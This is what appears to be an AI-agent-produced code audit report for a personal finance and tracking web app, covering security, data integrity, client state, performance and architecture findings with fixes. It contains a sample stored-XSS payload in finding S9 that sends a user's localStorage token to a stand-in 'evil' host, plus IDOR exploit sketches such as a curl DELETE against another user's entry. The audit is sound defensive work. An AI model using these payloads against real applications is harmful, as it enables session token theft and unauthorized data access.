# 1. Security

15 findings. The recurring theme is the storage layer being trusted to
enforce ownership when it doesn't, plus a few endpoints that take
attacker-controlled IDs without checking who owns the row.

## Critical

### S1. IDOR on single-entity GET endpoints
- **Location**: `server/routes.ts:2001` (and the parallel `/api/expenses/:id`, `/api/events/:id`, `/api/documents/:id`, `/api/habits/:id`, `/api/goals/:id`, `/api/domains/:id`, `/api/incomes/:id`)
- **Exploit**: Authenticated user A guesses or scrapes a UUID, hits `GET /api/tasks/<victim-uuid>`, gets the row. The route calls `storage.getTask(id)` without filtering by `req.userId`.
- **Fix**: After fetch, `if (row.userId !== req.userId) return res.status(404).json({ error: "Not found" });` (404, not 403, to prevent enumeration).

### S2. DELETE `/api/tracker-entries/:entryId` skips ownership check
- **Location**: `server/routes.ts:1951–1961`
- **Exploit**: `curl -X DELETE /api/tracker-entries/<victim-entry-id>` with any authenticated token deletes the row. The handler iterates the caller's trackers but never verifies the entry's parent tracker belongs to the caller.
- **Fix**: Look up the entry, verify `entry.tracker.userId === req.userId` before delete.

### S3. AI chat error response leaks internals in non-production
- **Location**: `server/routes.ts:354 / 374`
- **Exploit**: Trigger any error in the chat path; response body includes `detail: <raw error>`. If `NODE_ENV` is misconfigured in prod (or a preview env is exposed), Anthropic SDK errors leak partial keys, stack traces, and DB column names.
- **Fix**: Drop `detail` from the response unconditionally; log to stderr/Sentry only.

### S4. Public artifact endpoint enables enumeration + leaks data
- **Location**: `server/routes.ts:2874–2908` (`GET /api/public/artifacts/:token`)
- **Exploit**: 16-byte hex token space + no rate limiting = enumeration attack reveals every shared artifact's title and full content. 200 vs 404 reveal token validity.
- **Fix**: 32-byte tokens, per-IP rate limit (10/min), constant-time response timing, generic 404 body.

## High

### S5. File upload accepts arbitrary MIME via `application/octet-stream` fallback
- **Location**: `server/routes.ts:527–530`
- **Exploit**: POST a file with an unknown MIME, server normalizes it to `application/octet-stream` and stores it. Downstream AI parsing or any future viewer that trusts the stored MIME could be tricked.
- **Fix**: Whitelist allowed types (`image/png`, `image/jpeg`, `image/webp`, `application/pdf`); reject others with 415.

### S6. CSRF protection is absent on mutating endpoints
- **Location**: `server/security-headers.ts`, `server/index.ts`
- **Exploit**: Any POST/PATCH/DELETE can be triggered cross-origin via a victim's logged-in cookie if you ever switch to cookie auth. Today the app uses `Authorization: Bearer`, which mostly mitigates this — but `server/auth.ts:283–290` returns tokens in the JSON body, encouraging clients to localStorage them, which is XSS-stealable.
- **Fix**: Pick a path: either set HttpOnly + SameSite=Lax cookies and add CSRF tokens, or document that bearer-in-memory is the only supported pattern and never set cookies.

### S7. Auth middleware accepts empty bearer token
- **Location**: `server/auth.ts:102–117`
- **Exploit**: `Authorization: Bearer ` (trailing space, no token) reaches `supabase.auth.getUser("")`. Behavior depends on the SDK version; at minimum the call hits Supabase on every request.
- **Fix**: `if (!token || token.length < 20) return res.status(401)...` before calling Supabase.

### S8. Cron secret not constant-time compared
- **Location**: `server/routes.ts:461–465`
- **Exploit**: Timing attack on the cron secret (small, but real if the endpoint is publicly reachable).
- **Fix**: `crypto.timingSafeEqual(Buffer.from(provided), Buffer.from(expected))`.

## Medium

### S9. XSS in artifacts via `dangerouslySetInnerHTML` without sanitizer
- **Location**: `client/src/pages/artifacts.tsx:164`
- **Exploit**: User creates an artifact whose content is `<img src=x onerror="fetch('https://evil/?'+localStorage.token)">`. If artifacts are sharable, this becomes stored XSS hitting other users.
- **Fix**: Pipe the HTML through `DOMPurify.sanitize` before rendering.

### S10. No rate limiting on read endpoints
- **Location**: `server/routes.ts:2125–2155` (`GET /api/expenses`) and other list endpoints
- **Exploit**: Authenticated user can hammer the DB with complex filters and bypass cost controls.
- **Fix**: Per-user 100/min limit on list endpoints.

### S11. No key versioning in field encryption
- **Location**: `server/crypto-util.ts:10–30`
- **Why it bites**: If `FIELD_ENCRYPTION_KEY` is ever rotated, every previously-encrypted row becomes unreadable.
- **Fix**: Prefix ciphertext with a key id; support a list of keys for decryption.

## Low

### S12. Dev-mode error leakage if `NODE_ENV` is wrong
- **Location**: `server/routes.ts:374`
- **Fix**: Treat anything except `NODE_ENV=production` as production for error-shape purposes.

### S13. Tokens returned in JSON body invite localStorage usage
- **Location**: `server/auth.ts:283–290`
- See S6.

# 2. Data Integrity

16 findings. Two patterns dominate: schema-vs-migration drift (code
references columns that don't exist in SQL) and missing FKs that turn
deletes into orphan farms.

## Critical

### D1. `entity_links` has no foreign keys, no cascade
- **Location**: `supabase-migration.sql:280–290`
- **Scenario**: User deletes profile; every link from/to that profile lives forever. AI insights reference deleted entities; rollups join to ghosts.
- **Fix**: Either typed FKs per `source_type`/`target_type` with `ON DELETE CASCADE`, or an app-level "delete links first" hook on every entity delete.

### D2. Mood enum mismatch between `tracker_entries` and `journal_entries`
- **Location**: `supabase-migration.sql:52` (`great|good|okay|bad|terrible`) vs `:192` (`amazing|good|neutral|bad|awful`); schema declares an 8-level enum (`shared/schema.ts:535`).
- **Scenario**: Insert mood `amazing` into a tracker entry → CHECK constraint violation → 500.
- **Fix**: One unified enum across both tables and `shared/schema.ts`.

### D3. Schema declares columns that don't exist in the DB
- **Location**: `shared/schema.ts:221, 223, 234, 381` (declares `deletedAt`, `type_key`, `parentProfileId`, obligation `status`); migrations don't create them on `profiles`, `tasks`, `expenses`, `obligations`.
- **Scenario**: Soft-delete writes silently no-op; `parentProfileId` is shoved into the JSONB `fields._parentProfileId` (see `server/supabase-storage.ts:328`), so hierarchies are invisible to SQL filters.
- **Fix**: Add the columns + backfill from `fields.*`.

### D4. `obligation_payments` RLS relies on a missing FK assertion
- **Location**: `supabase-migration.sql:158–166`
- **Scenario**: If app code ever accepts an `obligation_id` from the client without re-verifying the parent obligation belongs to the caller, RLS won't catch the bypass.
- **Fix**: Add `obligation_id NOT NULL REFERENCES obligations(id) ON DELETE CASCADE` and assert ownership in the route.

## High

### D5. No `UNIQUE(user_id, name)` on `profiles`
- **Location**: `supabase-migration.sql:12–28`
- **Scenario**: User has two "Savings" profiles → AI entity resolution coin-flips between them; rollups split → numbers don't add up.
- **Fix**: Unique constraint + UI-side dedup hint.

### D6. `tracker_entries.profile_id` declared but never created
- **Location**: `shared/schema.ts:284` vs `supabase-migration.sql:45–55`
- **Scenario**: Profile-filtered tracker queries return cross-profile data, or fail.
- **Fix**: Add the column with FK + CASCADE.

### D7. Liability ↔ asset links can form cycles
- **Location**: `shared/asset-rollup.ts:85–98`, `server/storage.ts:46` (`wouldCreateCycle` doesn't cover liability→asset edges)
- **Scenario**: Asset A references liability B references asset A → rollup recurses or double-counts.
- **Fix**: Extend cycle detection across both link tables.

### D8. Soft-delete columns lack partial indexes
- **Location**: most tables in `supabase-migration.sql` (only `documents` got the index in `migrations/006`)
- **Scenario**: Lists scan all soft-deleted rows. Gets worse forever.
- **Fix**: `CREATE INDEX … ON <t>(user_id, deleted_at) WHERE deleted_at IS NULL` per soft-deletable table.

## Medium

### D9. `journalEntries.linkedProfiles` and `obligations.linkedProfiles` are JSON arrays, not junction tables
- **Location**: `shared/schema.ts:546, 392`
- **Scenario**: Profile filter logic must parse JSON in app; can't index. `passesProfileFilter()` becomes inconsistent across entity types.
- **Fix**: Junction tables `profile_journal_entries`, `profile_obligations`.

### D10. Asset ownership percentages can sum > 100
- **Location**: `shared/asset-rollup.ts:77–116`
- **Scenario**: Alice 60%, Bob 60% on the same asset → rollup reports 120% of the asset's value.
- **Fix**: Validate sum on insert/update; cap or reject.

### D11. Liability payment allocation defaults missing balance to 0
- **Location**: `shared/liability-calc.ts:147–167`
- **Scenario**: Payment with no recorded current balance → entire payment treated as principal even if interest accrued.
- **Fix**: Make `currentBalance` required.

## Low

### D12. Money is `NUMERIC(18,2)` everywhere
- **Location**: `supabase-migration.sql:79, 148, 162, …`
- **Why it bites**: Mostly fine, but JS-side rounding introduces drift over time. Cents-as-bigint is the standard fix.

### D13. `Insight` is in code, not in DB
- **Location**: `shared/schema.ts:887` vs no `insights` table
- **Why it bites**: Only matters if you ever want to persist insights — but that's almost certainly coming, and there's no schema for it.

# 3. State Management (React Query / Client State)

10 findings. The biggest cluster is **filtered query keys vs base-key
invalidation** — invalidations don't match the keys actually in cache.

## Critical

### ST1. Habits popup uses filtered key, mutations invalidate base key
- **Location**: `client/src/pages/dashboard.tsx:883` (query key `["/api/habits", filterMode, ...filterIds]`) vs `:891–905` (invalidates `["/api/habits"]`)
- **Repro**: Open Habits popup with a profile filter set; have AI chat create a habit; popup never updates.
- **Fix**: Invalidate by predicate: `queryClient.invalidateQueries({ predicate: q => q.queryKey[0] === "/api/habits" })`.

### ST2. Tasks popup has the same bug
- **Location**: `client/src/pages/dashboard.tsx:652` vs `:660–675`
- **Fix**: Same predicate-invalidate pattern.

### ST3. Profile filter in localStorage is global, not per user
- **Location**: `client/src/lib/profileFilter.ts:6` (`LOCAL_KEY = "portol_profile_filter_v3"`)
- **Repro**: User A picks "Bob" filter; signs out; User B signs in on same device → User B's dashboard is filtered to A's "Bob" id (which leaks the existence of A's profiles).
- **Fix**: Namespace key by authenticated user id; clear on sign-out.

## High

### ST4. Habits popup `onMutate` writes optimistic data to wrong cache entry
- **Location**: `client/src/pages/dashboard.tsx:891–898`
- **Repro**: Filter habits → check one in → optimistic update flickers/disappears because it's written under bare `["/api/habits"]` and the visible query is `["/api/habits", ...]`.

### ST5. Edit-expense modal reuses stale form state on second open

- **Repro**: Edit expense A → cancel → edit expense B → form briefly shows A's values.

### ST6. Dismissed-popup buckets break on timezone change / DST
- **Location**: `client/src/pages/dashboard.tsx:1107, 1113–1117`
- **Fix**: Persist `{ tz, date }` and re-bucket if tz changes.

## Medium

### ST7. AI chat invalidates only base endpoints, missing `/api/expenses?profileIds=…` variants
- **Location**: `client/src/pages/chat.tsx:1720–1736`
- **Fix**: Predicate invalidation for every endpoint AI mutates.

### ST8. Profile edit form doesn't reset when switching profiles
- **Location**: `client/src/pages/profiles.tsx`

### ST9. Module-level chat history cache won't refresh on mutations

# 5. Performance

20 findings. Big-O cliffs in tree building, mutation fan-out, missing
indexes, and an `invalidateAll` that thrashes 20+ queries per click.

## Critical

### P1. Mutation cascade invalidates 20+ unrelated keys
- **Location**: `client/src/lib/queryClient.ts:145–178`
- **Impact**: One `addExpense` triggers refetches on dashboard, profiles, obligations, budgets, tasks, etc. — 20+ HTTP round-trips per write.
- **Fix**: Targeted invalidation per mutation; remove the global cascade.

### P2. `buildTree` does O(n²) `.filter()` per recursion level
- **Location**: `server/routes.ts:1195–1210`
- **Impact**: 100 profiles → ~10k filter passes. 10k profiles → seconds of CPU per request.
- **Fix**: Build a `Map<parentId, Profile[]>` once, then index.

### P3. `/api/insights` loads every collection unfiltered
- **Location**: `server/routes.ts:1048–1069`
- **Impact**: Dashboard with one profile filter still pulls 10 full tables and filters in JS.
- **Fix**: Push the filter into the storage queries.

## High

### P5. Profile detail mounts the same tree query 3 times
- **Location**: `client/src/pages/profile-detail.tsx:405, 848, 990`

### P6. `staleTime: 5s` causes a refetch on every tab switch

### P8. Liability amortization rebuilt on every dashboard refetch

### P9. `NotificationBell` polls every 60s without cleanup on unmount

### P10. `/api/warmup` called twice on mount

### P11. Vite build has no chunk splitting

# 7. Architecture / What Will Break Later

15 findings. The risks that aren't burning today but will eat a quarter
when they do.

## Critical

### R1. In-memory `responseCache` won't survive multi-instance deploys
- **Location**: `server/routes.ts:93–187`
- **Why it bites**: Vercel functions are stateless. Each instance gets a cold cache; on TTL expiry, every instance simultaneously rebuilds the dashboard → thundering herd on Supabase.
- **Direction**: Move to Vercel KV / Redis, or push the caching to the client via React Query `staleTime`/`gcTime`.

### R2. Storage `Proxy` silently falls back to a global singleton
- **Location**: `server/storage.ts:2093–2130`, `server/routes.ts:18`
- **Why it bites**: `AsyncLocalStorage` is the safe path, but the Proxy's `get()` falls back to the global singleton if the request context is empty. A future code path that imports the singleton directly will silently mix users — and TypeScript won't see it.
- **Direction**: Remove the fallback; throw if no context. Add a lint rule against importing the singleton outside `routes.ts`.

### R3. Asset value resolution exists in 3 places
- **Location**: `server/supabase-storage.ts:32–100` (`resolveAssetValue` / `parseMoney`), `shared/asset-rollup.ts` (`extractBaseValue`), `client/src/pages/profile-detail.tsx:368–385` (`getAssetBaseValue`)
- **Why it bites**: Server total ≠ client total once any of them learns a new field path. This is the canonical "why don't the numbers match" bug.
- **Direction**: One function in `shared/`; both server and client import it. Snapshot test against 20 representative asset shapes.

### R4. `drizzle-kit push` is the migration strategy
- **Location**: `drizzle.config.ts`, `supabase-migration.sql` (19 KB monolith)
- **Why it bites**: No versioned migrations, no rollback path, no review of generated SQL. One bad column-rename takes prod down with no clean undo.
- **Direction**: `drizzle-kit generate` + reviewed migration files; CI check that compares `shared/schema.ts` against `information_schema`.

## High

### R5. Bounded rate-limit map evicts synchronously under attack
- **Location**: `server/routes.ts:58–80`
- **Why it bites**: O(n) eviction on every request once the map fills; under DDoS the eviction itself becomes the bottleneck.
- **Direction**: LRU library or push to Vercel/Cloudflare edge.

### R6. Anthropic model name hardcoded in 12+ places
- **Location**: `server/routes.ts:1516, 1547, 1697, 1699, 4109, 4111`; `server/ai-engine.ts:48, 213, 859, 8056`; `server/weekly-review.ts:14, 246`
- **Why it bites**: Every model swap is a 12-file grep. Easy to miss one and cause a regression for one feature.
- **Direction**: `server/ai-config.ts` exporting `chatModel`, `extractionModel`, `reportModel`.

### R7. Capacitor plugin imports inside web-served files
- **Location**: `client/src/pages/chat.tsx:1448–1458`
- **Why it bites**: Either the web build ships unused native code, or the iOS build breaks if web removes the plugin.
- **Direction**: `VITE_ENABLE_CAPACITOR` build-time gate.

### R8. Custom Vercel build pipeline with no smoke test
- **Location**: `script/build-vercel.ts`, `vercel.json`
- **Why it bites**: Vercel changes Node default → bundle output changes → silent prod 500s.
- **Direction**: Post-build smoke test that invokes the bundled handler with a `GET /api/health`.

### R9. AI engine pulls every profile into memory per message
- **Location**: `server/ai-engine.ts:2767`
- **Why it bites**: Fine at 100 profiles, painful at 1k, broken at 10k.
- **Direction**: Bound the snapshot; let the model ask for more if it needs it.

- **Location**: `tests/`
- **Why it bites**: No E2E coverage of asset / liability math means schema drift won't be caught by CI.
- **Direction**: Add `tests/asset-calculations.test.ts` covering 20 real-world shapes.

### R11. No central env config / startup validation
- **Location**: `server/{index,auth,routes,ai-engine}.ts`
- **Why it bites**: Missing env vars surface as 500s mid-request, not at boot.
- **Direction**: `server/config.ts` with Zod-validated env at module load.

- **Location**: `shared/timezone.ts` vs `client/src/hooks/use-timezone.tsx`
- **Direction**: Single source of truth in `shared/`.

### R13. No secrets scanning in CI
- **Location**: `.github/`
- **Direction**: `detect-secrets` pre-commit + GitHub Action.

## Low

# Method

Each section above was produced by an agent that read the relevant
slice of the codebase end-to-end and was instructed to cite real
`file:line` references with concrete repros — no generic advice. Some
findings note that the in-code state already partially mitigates the
issue (e.g., U6 form has guards but the trash button doesn't); these
are kept because the inconsistency itself is the bug.

Findings are independent — no agent saw any other agent's report — so
overlap between sections (e.g., S1 / D1 both touch ownership) is
intentional and signals a pattern rather than a one-off.
